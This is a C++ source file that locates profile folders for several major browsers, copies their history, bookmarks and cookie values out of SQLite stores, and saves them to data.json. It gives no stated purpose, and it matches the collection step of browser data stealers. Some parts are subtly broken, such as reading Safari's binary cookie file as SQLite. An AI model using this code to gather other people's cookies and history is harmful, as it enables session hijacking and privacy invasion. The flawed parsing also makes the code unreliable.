#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <iomanip>

namespace fs = std::filesystem;
using json = nlohmann::json;

enum class Browser { Chrome, Firefox, Safari, Edge, Opera, Other };

std::vector<std::string> findProfilePaths(Browser browser) {
    std::vector<std::string> profilePaths;
    const char* homeDir = nullptr;

#ifdef _WIN32
    homeDir = std::getenv("LOCALAPPDATA");
    if (homeDir == nullptr) {
        std::cerr << "Error: Unable to retrieve LOCALAPPDATA environment variable." << std::endl;
        return profilePaths;
    }
#else
    homeDir = std::getenv("HOME");
    if (homeDir == nullptr) {
        std::cerr << "Error: Unable to retrieve HOME environment variable." << std::endl;
        return profilePaths;
    }
#endif

    std::string profilePath;
    switch(browser) {
        case Browser::Chrome:
#ifdef _WIN32
            profilePath = std::string(homeDir) + "\\Google\\Chrome\\User Data\\";
#else
            profilePath = std::string(homeDir) + "/.config/google-chrome/";
#endif
            break;
        case Browser::Firefox:
#ifdef _WIN32
            profilePath = std::string(homeDir) + "\\Mozilla\\Firefox\\Profiles\\";
#else
            profilePath = std::string(homeDir) + "/.mozilla/firefox/";
#endif
            break;
        case Browser::Safari:
#ifdef _WIN32
            profilePath = std::string(homeDir) + "\\Apple\\Safari\\";
#else
            profilePath = std::string(homeDir) + "/Library/Safari/";
#endif
            break;
        case Browser::Edge:
#ifdef _WIN32
            profilePath = std::string(homeDir) + "\\Microsoft\\Edge\\User Data\\";
#else
            profilePath = std::string(homeDir) + "/.config/microsoft-edge/";
#endif
            break;
        case Browser::Opera:
#ifdef _WIN32
            profilePath = std::string(homeDir) + "\\Opera Software\\Opera Stable\\";
#else
            profilePath = std::string(homeDir) + "/.config/opera/Opera/";
#endif
            break;
        case Browser::Other:
            // Définir le chemin pour un autre navigateur selon le système d'exploitation
            break;
    }

    if (fs::exists(profilePath)) {
        profilePaths.push_back(profilePath);
    }

    return profilePaths;
}

void extractFromSQLite(const std::string& dbPath, const char* query, const std::string& entityType, json& outputJson) {
    sqlite3* db;
    int rc = sqlite3_open(dbPath.c_str(), &db);
    if (rc) {
        std::cerr << "Can't open " << entityType << " database: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return;
    }

    sqlite3_stmt* stmt;
    rc = sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to execute " << entityType << " query: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json entityData;
        for (int i = 0; i < sqlite3_column_count(stmt); ++i) {
            const unsigned char* columnValue = sqlite3_column_text(stmt, i);
            if (columnValue) {
                std::string value(reinterpret_cast<const char*>(columnValue));
                entityData[sqlite3_column_name(stmt, i)] = value;
            }
        }
        outputJson[entityType].push_back(entityData);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extractChromeData(const std::string& profilePath, json& outputJson) {
    extractFromSQLite(profilePath + "History", "SELECT url, title, visit_count FROM urls;", "Chrome History", outputJson);
    extractFromSQLite(profilePath + "Cookies", "SELECT name, value, host_key, path FROM cookies;", "Chrome Cookies", outputJson);
    // Extraction des bookmarks depuis le fichier JSON (Pas besoin de SQLite)
    std::ifstream bookmarksFile(profilePath + "Bookmarks");
    if (bookmarksFile.is_open()) {
        json bookmarksData;
        bookmarksFile >> bookmarksData;
        for (const auto& bookmark : bookmarksData["roots"]["bookmark_bar"]["children"]) {
            json bookmarkJson;
            bookmarkJson["url"] = bookmark["url"];
            bookmarkJson["title"] = bookmark["name"];
            outputJson["Chrome Bookmarks"].push_back(bookmarkJson);
        }
    } else {
        std::cerr << "Can't open Chrome bookmarks file: " << profilePath << "Bookmarks" << std::endl;
    }
}

void extractFirefoxData(const std::string& profilePath, json& outputJson) {
    extractFromSQLite(profilePath + "/places.sqlite", "SELECT url, title FROM moz_places WHERE id IN (SELECT fk FROM moz_bookmarks WHERE type = 1);", "Firefox Bookmarks", outputJson);
    extractFromSQLite(profilePath + "/places.sqlite", "SELECT url, title, visit_count FROM moz_places;", "Firefox History", outputJson);
    extractFromSQLite(profilePath + "/cookies.sqlite", "SELECT name, value, host, path FROM moz_cookies;", "Firefox Cookies", outputJson);
    extractFromSQLite(profilePath + "/places.sqlite", "SELECT id, place_id, anno_attribute_id, content, flags, expiration, type, dateAdded, lastModified FROM moz_annos;", "Firefox Downloads", outputJson);
}

void extractSafariData(const std::string& profilePath, json& outputJson) {
    extractFromSQLite(profilePath + "History.db", "SELECT url, title, visit_count FROM history;", "Safari History", outputJson);
    extractFromSQLite(profilePath + "Cookies.binarycookies", "SELECT name, value, host, path FROM cookies;", "Safari Cookies", outputJson);
}

void extractEdgeData(const std::string& profilePath, json& outputJson) {
    extractFromSQLite(profilePath + "History", "SELECT url, title, visit_count FROM urls;", "Edge History", outputJson);
    extractFromSQLite(profilePath + "Cookies", "SELECT name, value, host_key, path FROM cookies;", "Edge Cookies", outputJson);
}

void extractOperaData(const std::string& profilePath, json& outputJson) {
    extractFromSQLite(profilePath + "History", "SELECT url, title, visit_count FROM urls;", "Opera History", outputJson);
    extractFromSQLite(profilePath + "Cookies4", "SELECT name, value, host, path FROM cookies;", "Opera Cookies", outputJson);
}

std::vector<std::string> findSubfoldersWithLoginJSON(const std::string& folderPath) {
    std::vector<std::string> subfolders;
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_directory()) {
            std::string loginPath = entry.path().string() + "/History";
            if (fs::exists(loginPath)) {
                subfolders.push_back(entry.path().string());
            }
        }
    }
    return subfolders;
}


int main() {
    json outputJson;

    for (const auto& path : findProfilePaths(Browser::Chrome)) {
        for (const auto& subfolder : findSubfoldersWithLoginJSON(path)) {
            extractChromeData(subfolder, outputJson);
        }
    }
    for (const auto& path : findProfilePaths(Browser::Firefox)) {
        for (const auto& subfolder : findSubfoldersWithLoginJSON(path)) {
            extractFirefoxData(subfolder, outputJson);
        }
    }
    for (const auto& path : findProfilePaths(Browser::Safari)) {
        for (const auto& subfolder : findSubfoldersWithLoginJSON(path)) {
            extractSafariData(subfolder, outputJson);
        }
    }
    for (const auto& path : findProfilePaths(Browser::Edge)) {
        for (const auto& subfolder : findSubfoldersWithLoginJSON(path)) {
            extractEdgeData(subfolder, outputJson);
        }
    }
    for (const auto& path : findProfilePaths(Browser::Opera)) {
        for (const auto& subfolder : findSubfoldersWithLoginJSON(path)) {
            extractOperaData(subfolder, outputJson);
        }
    }

    std::ofstream outputFile("data.json");
    if (outputFile.is_open()) {
        outputFile << std::setw(4) << outputJson << std::endl;
        outputFile.close();
    } else {
        std::cerr << "Failed to open output file." << std::endl;
        return 1;
    }

    return 0;
}
